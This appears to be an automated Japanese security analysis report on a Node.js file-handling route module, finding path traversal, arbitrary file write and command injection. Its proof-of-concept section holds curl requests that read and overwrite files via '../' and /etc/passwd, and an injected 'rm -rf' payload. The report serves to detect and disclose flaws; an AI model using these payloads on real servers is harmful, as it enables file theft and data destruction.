# 解析レポート

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 80**

## 脆弱性タイプ

- `LFI`
- `AFO`
- `RCE`

## 解析結果

本ルート定義では、ユーザ入力をファイルパスやシェルコマンドに直接組み込んでおり、パス・トラバーサル（LFI）、任意ファイル書き込み（AFO）、およびコマンドインジェクション（RCE）の脆弱性が存在します。具体的には、アップロード時にreq.file.originalnameをそのままpath.joinに渡しているため“../”等でサーバ上の任意のパスへ書き込み可能です。また、ダウンロード・読み取り・削除・メタデータ取得でも、検証なしにreq.query.filenameやreq.query.path、req.body.filenameをpath.joinへ渡しており、サーバ上の任意ファイルを列挙・読み込み・削除される可能性があります。さらに圧縮処理ではユーザー指定のファイル名配列をシェルコマンドに直結しており、シェルインジェクションによるRCEが可能です。

## PoC（概念実証コード）

```text
1) 任意書き込み (AFO):
   curl -F "file=@/etc/passwd;filename=../../../../tmp/pwned" http://host/upload
   → /tmp/pwned に /etc/passwd のコピーが作成される

2) 任意読み取り (LFI):
   curl "http://host/read?path=/etc/passwd"
   → /etc/passwd がJSONで返却される

3) コマンドインジェクション (RCE):
   POST /compress
   Body: {"files": ["file1.txt; rm -rf /important_data; echo used"], "archive_name":"out.tar.gz"}
   → execSyncでrmコマンドが実行される
```

## 関連コードコンテキスト

### 関数名: /upload endpoint
- 理由: アップロードされたファイル名を検証せずに結合しているため、`../`を含む名前で任意パスへの書き込みが可能（AFO）
- パス: repo/routes/files.js
```rust
const uploadPath = path.join(UPLOAD_CONFIG.UPLOAD_DIR, req.file.originalname);
```

### 関数名: /download endpoint
- 理由: クエリパラメータfilenameを検証せずに結合しているため、サーバ上の任意ファイルをダウンロード可能（LFI）
- パス: repo/routes/files.js
```rust
const filePath = path.join(UPLOAD_CONFIG.UPLOAD_DIR, filename);
```

### 関数名: /read endpoint
- 理由: クエリパラメータにそのまま渡しているため任意ファイルを読み取れる（LFI）
- パス: repo/routes/files.js
```rust
const { path: filePath } = req.query; const content = fs.readFileSync(filePath, 'utf8');
```

### 関数名: /list endpoint
- 理由: dirパラメータを検証せずに利用しており、サーバ上の任意ディレクトリを列挙可能（LFI）
- パス: repo/routes/files.js
```rust
const directory = dir || UPLOAD_CONFIG.UPLOAD_DIR; const files = fs.readdirSync(directory);
```

### 関数名: /compress endpoint
- 理由: ユーザー入力をシェルコマンドに展開して実行しており、シェルインジェクションでRCEが可能（RCE）
- パス: repo/routes/files.js
```rust
const command = `tar -czf ${archivePath} ${fileList}`; const output = execSync(command, { encoding: 'utf8' });
```

## 解析ノート

ステップ1: エントリポイントを調査
- upload, download, read, list, delete, extract, compress, metadataの各ルートが存在

ステップ2: ユーザ制御可能な入力を特定
- upload: req.file.originalname
- download/read/list/delete/metadata: req.query.filename, req.query.path, req.query.dir, req.body.filename
- compress: req.body.files配列, archive_name

ステップ3: データフロー追跡とサニタイズ不在の確認
- path.joinに直接流し込み
- execSyncでコマンド文字列を生成

ステップ4: 脆弱性分類
- pathベース：LFI/AFO
- shellベース：RCE

ステップ5: 影響評価
- 高権限で動作する場合、サーバ完全乗っ取りや重要ファイル読取/書き換えが可能

